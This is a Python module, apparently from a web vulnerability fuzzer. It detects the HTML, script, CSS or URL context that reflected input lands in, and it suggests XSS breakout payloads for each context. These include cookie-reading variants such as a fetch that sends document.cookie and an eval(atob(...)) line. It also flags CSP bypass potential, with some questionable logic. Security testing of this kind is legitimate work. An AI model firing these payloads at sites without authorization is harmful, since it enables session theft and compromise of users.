"""
XSS Context Analyzer - determines HTML/JS/CSS context of reflected input.

This is the strategic module that tells the fuzzer WHAT context the payload
will land in, enabling context-appropriate payload generation instead of
blind spraying.
"""

import re
import html
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import unquote


# ---------------------------------------------------------------------------
# Enums / Constants
# ---------------------------------------------------------------------------

class XSSContext:
    HTML = "html"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_COMMENT = "html_comment"
    SCRIPT_BLOCK = "script_block"
    SCRIPT_STRING = "script_string"
    SCRIPT_LINE_COMMENT = "script_line_comment"
    SCRIPT_BLOCK_COMMENT = "script_block_comment"
    SCRIPT_TEMPLATE_LITERAL = "script_template_literal"
    SCRIPT_ATTRIBUTE = "script_attribute"
    EVENT_HANDLER = "event_handler"
    EVENT_HANDLER_STRING = "event_handler_string"
    CSS_BLOCK = "css_block"
    CSS_STRING = "css_string"
    CSS_IMPORT = "css_import"
    SVG_EMBED = "svg_embed"
    JSON_EMBED = "json_embed"
    URL_ATTRIBUTE = "url_attribute"
    UNKNOWN = "unknown"


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------

@dataclass
class ContextInfo:
    """Describes the exact HTML/JS/CSS context where input lands."""
    context: str  # XSSContext constant
    tag: str = ""  # enclosing HTML tag name
    attribute: str = ""  # attribute name (if in attribute context)
    quote_char: str = ""  # """, "'", "`", or "" (none)
    escape_preview: str = ""  # how the payload appears in response
    full_surrounding: str = ""  # surrounding HTML snippet
    line_before: str = ""  # line containing input
    is_direct_output: bool = False  # input directly in response without encoding
    encoding_detected: List[str] = field(default_factory=list)  # html, url, js, base64
    blocked_chars: List[str] = field(default_factory=list)


@dataclass
class ContextAnalysisResult:
    """Full analysis of XSS context for a parameter."""
    parameter: str
    original_payload: str
    contexts_found: List[ContextInfo] = field(default_factory=list)
    primary_context: str = XSSContext.UNKNOWN
    recommendation: str = ""
    confidence: float = 0.0  # 0.0 - 1.0
    suggested_payloads: List[str] = field(default_factory=list)
    waf_detected: bool = False
    csp_analysis: Dict = field(default_factory=dict)


# ---------------------------------------------------------------------------
# CSP Analysis Constants
# ---------------------------------------------------------------------------

CSP_DIRECTIVE_MAP = {
    "script-src": "script",
    "script-src-elem": "script",
    "script-src-attr": "script",
    "style-src": "style",
    "style-src-elem": "style",
    "style-src-attr": "style",
    "img-src": "image",
    "connect-src": "connect",
    "frame-src": "frame",
    "child-src": "frame",
    "font-src": "font",
    "media-src": "media",
    "object-src": "object",
    "default-src": "default",
}

# ---------------------------------------------------------------------------
# Regex Patterns for Context Detection
# ---------------------------------------------------------------------------

CANARY = "NeUrOsPlOiT_12345_XXS_MaRkEr"
CANARY_PATTERN = re.escape(CANARY)

# HTML contexts
RE_IN_HTML_TEXT = re.compile(
    r'(?:^|>)([^<]*?)' + CANARY_PATTERN + r'([^<]*?)(?:$|<)', re.DOTALL)
RE_IN_HTML_ATTRIBUTE = re.compile(
    r'<\s*(\w+)\s[^>]*?(\w[\w-]*)\s*=\s*["\']?([^"\'>]*?)' +
    CANARY_PATTERN + r'([^"\'>]*?)[\'"]?\s*[>/\s]', re.DOTALL)
RE_IN_HTML_COMMENT = re.compile(
    r'<!--(.*?)' + CANARY_PATTERN + r'(.*?)-->', re.DOTALL)
RE_IN_TAG_NAME = re.compile(
    r'<\s*(' + CANARY_PATTERN + r'[^>]*?)>', re.DOTALL)

# Script contexts
RE_IN_SCRIPT_BLOCK = re.compile(
    r'<\s*script\b[^>]*>(.*?)' + CANARY_PATTERN + r'(.*?)</\s*script\s*>', re.DOTALL)
RE_IN_SCRIPT_STRING = re.compile(
    r"""(['"`])((?:[^\\1]|\\.)*?)""" + CANARY_PATTERN + r"""((?:[^\\1]|\\.)*?)\1""", re.DOTALL)
RE_IN_SCRIPT_COMMENT_LINE = re.compile(
    r'//(.*?)' + CANARY_PATTERN + r'(.*?)$', re.MULTILINE)
RE_IN_SCRIPT_COMMENT_BLOCK = re.compile(
    r'/\*(.*?)' + CANARY_PATTERN + r'(.*?)\*/', re.DOTALL)
RE_IN_SCRIPT_TEMPLATE = re.compile(
    r'`((?:[^\\`]|\\[\s\S])*?)' + CANARY_PATTERN + r'((?:[^\\`]|\\[\s\S])*?)`', re.DOTALL)

# Event handler contexts
RE_IN_EVENT_HANDLER = re.compile(
    r'<\s*\w+\s[^>]*?\bon[a-zA-Z]+\s*=\s*["\']?([^"\'>]*?)' +
    CANARY_PATTERN + r'([^"\'>]*?)["\']?', re.DOTALL)

# CSS contexts
RE_IN_STYLE_BLOCK = re.compile(
    r'<\s*style\b[^>]*>(.*?)' + CANARY_PATTERN + r'(.*?)</\s*style\s*>', re.DOTALL)
RE_IN_STYLE_STRING = re.compile(
    r"""(['"])(.*?)""" + CANARY_PATTERN + r"""(.*?)\1""", re.DOTALL)

# URL contexts
RE_IN_URL_HREF = re.compile(
    r'href\s*=\s*["\']([^"\']*?)' + CANARY_PATTERN + r'([^"\']*?)["\']', re.DOTALL)
RE_IN_URL_SRC = re.compile(
    r'src\s*=\s*["\']([^"\']*?)' + CANARY_PATTERN + r'([^"\']*?)["\']', re.DOTALL)
RE_IN_URL_ACTION = re.compile(
    r'action\s*=\s*["\']([^"\']*?)' + CANARY_PATTERN + r'([^"\']*?)["\']', re.DOTALL)

# JSON context (in script or inline)
RE_IN_JSON = re.compile(
    r'["\']\s*:\s*["\']([^"\']*?)' + CANARY_PATTERN + r'([^"\']*?)["\']', re.DOTALL)


# ---------------------------------------------------------------------------
# XSSContextAnalyzer
# ---------------------------------------------------------------------------

class XSSContextAnalyzer:
    """Determines the exact HTML/JS/CSS context where reflected input lands."""

    def __init__(self):
        self._canary_cache: Dict[str, str] = {}

    def generate_canary(self, param_name: str = "") -> str:
        """Generate a unique canary for tracking reflection."""
        import hashlib
        import time
        seed = f"{param_name}_{time.time()}"
        hash_digest = hashlib.md5(seed.encode()).hexdigest()[:12]
        return f"ns_{hash_digest}_{param_name[:8]}" if param_name else f"ns_{hash_digest}"

    def analyze_context(
        self,
        response_body: str,
        payload: str,
        param_name: str = "",
    ) -> ContextAnalysisResult:
        """Analyze where the reflected payload lands in the HTML response."""
        result = ContextAnalysisResult(
            parameter=param_name,
            original_payload=payload,
        )

        if not response_body or payload not in response_body:
            return result

        # Locate where the payload was reflected
        payload_start = response_body.index(payload)
        payload_end = payload_start + len(payload)

        # Get surrounding context (up to 500 chars before and after)
        context_start = max(0, payload_start - 500)
        context_end = min(len(response_body), payload_end + 1000)
        surrounding = response_body[context_start:context_end]

        # Replace payload with canary for regex matching
        replacement = response_body[:context_start] + \
            response_body[context_start:payload_start] + \
            CANARY + \
            response_body[payload_end:context_end] + \
            response_body[context_end:]

        contexts = self._detect_all_contexts(replacement, surrounding, payload)
        result.contexts_found = contexts

        if contexts:
            # Primary context = innermost / most specific
            primary = self._determine_primary_context(contexts)
            result.primary_context = primary.context
            result.confidence = self._confidence_for_context(primary)
            result.suggested_payloads = self._generate_suggestions(primary, payload)
            result.recommendation = self._build_recommendation(primary)
        else:
            result.recommendation = (
                "Payload not reflected or heavily modified. "
                "Try the POST version of this parameter. "
                "If still not reflected, parameter may not be injectable."
            )

        # Detect encodings
        result.contexts_found = [
            self._detect_encodings(c, replacement, payload)
            for c in result.contexts_found
        ]

        # CSP analysis
        result.csp_analysis = self._analyze_csp(response_body)
        if result.csp_analysis:
            result.waf_detected = True  # CSP may block certain payloads

        return result

    def _detect_all_contexts(
        self, text: str, surrounding: str, original_payload: str,
    ) -> List[ContextInfo]:
        """Find all contexts where the canary appears."""
        contexts: List[ContextInfo] = []

        checks = [
            # (name, regex, context_type, extractor_fn)
            ("script_string", RE_IN_SCRIPT_STRING),
            ("script_template_literal", RE_IN_SCRIPT_TEMPLATE),
            ("script_line_comment", RE_IN_SCRIPT_COMMENT_LINE),
            ("script_block_comment", RE_IN_SCRIPT_COMMENT_BLOCK),
            ("script_block", RE_IN_SCRIPT_BLOCK),
            ("event_handler", RE_IN_EVENT_HANDLER),
            ("html_comment", RE_IN_HTML_COMMENT),
            ("html_attribute", RE_IN_HTML_ATTRIBUTE),
            ("url_href", RE_IN_URL_HREF),
            ("url_src", RE_IN_URL_SRC),
            ("url_action", RE_IN_URL_ACTION),
            ("style_string", RE_IN_STYLE_STRING),
            ("style_block", RE_IN_STYLE_BLOCK),
            ("html_text", RE_IN_HTML_TEXT),
        ]

        for check_name, regex in checks:
            m = regex.search(text)
            if m:
                ctx = self._build_context_info(check_name, m, surrounding, original_payload)
                if ctx:
                    contexts.append(ctx)

        return contexts

    def _build_context_info(
        self, check_name: str, match, surrounding: str, payload: str,
    ) -> Optional[ContextInfo]:
        """Build a ContextInfo from a regex match."""
        ctx = ContextInfo(context=XSSContext.UNKNOWN, full_surrounding=surrounding)

        if check_name == "html_text":
            ctx.context = XSSContext.HTML
            ctx.is_direct_output = True

        elif check_name == "html_attribute":
            ctx.context = XSSContext.HTML_ATTRIBUTE
            ctx.tag = match.group(1)
            ctx.attribute = match.group(2)
            # Determine quote char
            before = match.group(3)
            if before and before[-1] in "'\"":
                ctx.quote_char = before[-1]
            elif match.group(0).strip().endswith(("'", '"')):
                ctx.quote_char = match.group(0).strip()[-1]

        elif check_name == "html_comment":
            ctx.context = XSSContext.HTML_COMMENT

        elif check_name == "script_block":
            ctx.context = XSSContext.SCRIPT_BLOCK
            ctx.is_direct_output = True

        elif check_name == "script_string":
            ctx.context = XSSContext.SCRIPT_STRING
            ctx.quote_char = match.group(1)

        elif check_name == "script_line_comment":
            ctx.context = XSSContext.SCRIPT_LINE_COMMENT

        elif check_name == "script_block_comment":
            ctx.context = XSSContext.SCRIPT_BLOCK_COMMENT

        elif check_name == "script_template_literal":
            ctx.context = XSSContext.SCRIPT_TEMPLATE_LITERAL
            ctx.quote_char = "`"

        elif check_name == "event_handler":
            ctx.context = XSSContext.EVENT_HANDLER
            # Determine if payload is within quotes
            before = match.group(1)
            if before and before[-1] in "'\"":
                ctx.context = XSSContext.EVENT_HANDLER_STRING
                ctx.quote_char = before[-1]

        elif check_name == "style_string":
            ctx.context = XSSContext.CSS_STRING
            ctx.quote_char = match.group(1)

        elif check_name == "style_block":
            ctx.context = XSSContext.CSS_BLOCK

        elif check_name in ("url_href", "url_src", "url_action"):
            ctx.context = XSSContext.URL_ATTRIBUTE

        # Build escape preview
        ctx.escape_preview = self._build_escape_preview(surrounding, payload)

        return ctx

    def _determine_primary_context(self, contexts: List[ContextInfo]) -> ContextInfo:
        """Pick the most specific/exploitable context."""
        # Priority: most specific contexts first
        priority_order = [
            XSSContext.SCRIPT_STRING,
            XSSContext.SCRIPT_TEMPLATE_LITERAL,
            XSSContext.EVENT_HANDLER_STRING,
            XSSContext.EVENT_HANDLER,
            XSSContext.SCRIPT_BLOCK,
            XSSContext.SCRIPT_LINE_COMMENT,
            XSSContext.SCRIPT_BLOCK_COMMENT,
            XSSContext.CSS_STRING,
            XSSContext.CSS_BLOCK,
            XSSContext.HTML_ATTRIBUTE,
            XSSContext.URL_ATTRIBUTE,
            XSSContext.HTML_COMMENT,
            XSSContext.HTML,
            XSSContext.UNKNOWN,
        ]

        for priority in priority_order:
            for ctx in contexts:
                if ctx.context == priority:
                    return ctx

        return contexts[0] if contexts else ContextInfo(context=XSSContext.UNKNOWN)

    @staticmethod
    def _confidence_for_context(ctx: ContextInfo) -> float:
        """Return confidence score 0.0-1.0 based on how precisely we know the context."""
        scores = {
            XSSContext.HTML: 0.7,
            XSSContext.HTML_ATTRIBUTE: 0.7,
            XSSContext.HTML_COMMENT: 0.6,
            XSSContext.SCRIPT_BLOCK: 0.6,
            XSSContext.SCRIPT_STRING: 0.8,
            XSSContext.SCRIPT_LINE_COMMENT: 0.5,
            XSSContext.SCRIPT_BLOCK_COMMENT: 0.5,
            XSSContext.SCRIPT_TEMPLATE_LITERAL: 0.8,
            XSSContext.EVENT_HANDLER: 0.7,
            XSSContext.EVENT_HANDLER_STRING: 0.8,
            XSSContext.CSS_BLOCK: 0.4,
            XSSContext.CSS_STRING: 0.5,
            XSSContext.URL_ATTRIBUTE: 0.5,
            XSSContext.UNKNOWN: 0.1,
        }
        return scores.get(ctx.context, 0.3)

    def _generate_suggestions(
        self, ctx: ContextInfo, payload: str,
    ) -> List[str]:
        """Generate context-appropriate XSS payloads."""
        suggestions: List[str] = []

        if ctx.context == XSSContext.HTML:
            suggestions.extend([
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ])

        elif ctx.context == XSSContext.HTML_ATTRIBUTE:
            if ctx.quote_char:
                # Break out of attribute, then inject tag
                suggestions.extend([
                    f'{ctx.quote_char}><script>alert(1)</script>',
                    f'{ctx.quote_char} onmouseover=alert(1) x="',
                    f'{ctx.quote_char} autofocus onfocus=alert(1) x="',
                    f'" onmouseover=alert(1)//',
                ])
            else:
                suggestions.extend([
                    ' onclick=alert(1)',
                    ' onmouseover=alert(1)',
                    ' onfocus=alert(1) autofocus',
                ])

        elif ctx.context == XSSContext.SCRIPT_STRING:
            if ctx.quote_char:
                suggestions.extend([
                    f'{ctx.quote_char};alert(1);//',
                    f'{ctx.quote_char}-alert(1)-{ctx.quote_char}',
                    f'</script><script>alert(1)</script>',
                    f'\\x27-alert(1)//',
                ])
            else:
                suggestions.extend([
                    ';alert(1)//',
                    '-alert(1)-',
                    '</script><script>alert(1)</script>',
                ])

        elif ctx.context == XSSContext.SCRIPT_TEMPLATE_LITERAL:
            suggestions.extend([
                '${alert(1)}',
                '${eval("alert(1)")}',
                '</script><script>alert(1)</script>',
            ])

        elif ctx.context == XSSContext.EVENT_HANDLER:
            suggestions.extend([
                'alert(1)',
                'alert(document.cookie)',
                'fetch("/?c="+document.cookie)',
                'eval(atob("YWxlcnQoMSk="))',
            ])

        elif ctx.context == XSSContext.EVENT_HANDLER_STRING:
            suggestions.extend([
                f'{ctx.quote_char};alert(1)//',
                f'{ctx.quote_char};alert(document.cookie)//',
            ])

        elif ctx.context == XSSContext.SCRIPT_LINE_COMMENT:
            suggestions.extend([
                '\nalert(1)\n//',
                '\n%0aalert(1)%0a//',
                '</script>\n<script>alert(1)</script>\n<script>',
            ])

        elif ctx.context == XSSContext.SCRIPT_BLOCK_COMMENT:
            suggestions.extend([
                '*/alert(1)/*',
                '*/\nalert(1)\n/*',
            ])

        elif ctx.context == XSSContext.HTML_COMMENT:
            suggestions.extend([
                '--><script>alert(1)</script><!--',
                '--><img src=x onerror=alert(1)><!--',
            ])

        elif ctx.context == XSSContext.URL_ATTRIBUTE:
            suggestions.extend([
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ])

        elif ctx.context == XSSContext.CSS_STRING:
            suggestions.extend([
                '}</style><script>alert(1)</script><style>',
                '\\000043ross-site-scripting(1)',
            ])

        return suggestions[:8]

    def _build_recommendation(self, ctx: ContextInfo) -> str:
        """Build a human-readable recommendation."""
        rec = f"Reflected XSS: payload lands in **{ctx.context}** context"

        if ctx.tag:
            rec += f" within <{ctx.tag}>"
        if ctx.attribute:
            rec += f" attribute '{ctx.attribute}'"
        if ctx.quote_char:
            q = {"'": "single-quoted", '"': "double-quoted", '`': "backtick"}.get(
                ctx.quote_char, ctx.quote_char
            )
            rec += f" ({q})"

        rec += "."

        if ctx.encoding_detected:
            enc = ", ".join(ctx.encoding_detected)
            rec += f" Input is {enc}-encoded."

        if ctx.blocked_chars:
            chars = ", ".join(repr(c) for c in ctx.blocked_chars)
            rec += f" Characters blocked: {chars}"

        return rec

    def _build_escape_preview(self, surrounding: str, payload: str) -> str:
        """Show how the payload appears escaped in the response."""
        if payload in surrounding:
            idx = surrounding.index(payload)
            start = max(0, idx - 40)
            end = min(len(surrounding), idx + len(payload) + 40)
            snippet = surrounding[start:end]
            if start > 0:
                snippet = "..." + snippet
            if end < len(surrounding):
                snippet = snippet + "..."
            return snippet
        return "[payload not found in surrounding context]"

    @staticmethod
    def _detect_encodings(ctx: ContextInfo, text: str, original: str) -> ContextInfo:
        """Detect which encodings are applied to the reflected input."""
        # Check HTML entities
        html_encoded = html.escape(original)
        if html_encoded in text and original not in text:
            ctx.encoding_detected.append("html")

        # Check URL encoding
        from urllib.parse import quote
        url_encoded = quote(original)
        if url_encoded in text and original not in text:
            ctx.encoding_detected.append("url")

        # Check JS escape sequences
        js_encoded = original.replace("<", "\\x3C").replace(">", "\\x3E")
        if js_encoded in text and original not in text:
            ctx.encoding_detected.append("js_escape")

        # Check for blocked characters
        blocked = set()
        for ch in '<>"\'`/\\':
            if ch in original and ch not in (ctx.escape_preview or ""):
                blocked.add(ch)
        ctx.blocked_chars = sorted(blocked)

        return ctx

    # ── CSP Analysis ──────────────────────────────────────────────────────

    @staticmethod
    def _analyze_csp(body: str) -> Dict:
        """Parse Content-Security-Policy from HTTP response or meta tag."""
        csp = {}

        # Check HTML body for CSP meta tag
        csp_meta = re.findall(
            r'<meta\s+http-equiv=["\']Content-Security-Policy["\']\s+content=["\']([^"\']+)["\']',
            body, re.IGNORECASE,
        )
        csp_string = " ".join(csp_meta) if csp_meta else ""

        if not csp_string:
            return csp

        directives = {}
        for directive in csp_string.split(";"):
            d = directive.strip()
            if not d:
                continue
            parts = d.split()
            name = parts[0].lower()
            values = parts[1:]
            directives[name] = values

        csp["directives"] = directives

        # Check for unsafe policies
        unsafe = []
        for name, values in directives.items():
            if "unsafe-inline" in values and "nonce" not in values and "hash" not in values:
                unsafe.append(f"{name} allows unsafe-inline")
            if "unsafe-eval" in values:
                unsafe.append(f"{name} allows unsafe-eval")
            if "*" in values:
                unsafe.append(f"{name} uses wildcard * source")

        csp["unsafe"] = unsafe
        csp["strict"] = len(unsafe) == 0 and len(directives) > 0

        # Check for bypass potential
        bypasses = []
        for name, values in directives.items():
            cat = CSP_DIRECTIVE_MAP.get(name, "")
            if cat == "script" and "unsafe-inline" in values:
                bypasses.append("unsafe-inline allows direct script injection")
            if cat == "script" and any("https:" in v or "http:" in v for v in values):
                bypasses.append("JSONP endpoint may allow script-src bypass")
            if "report-uri" in directives:
                bypasses.append("CSP in report-only mode — no actual blocking")

        csp["bypass_potential"] = bypasses

        return csp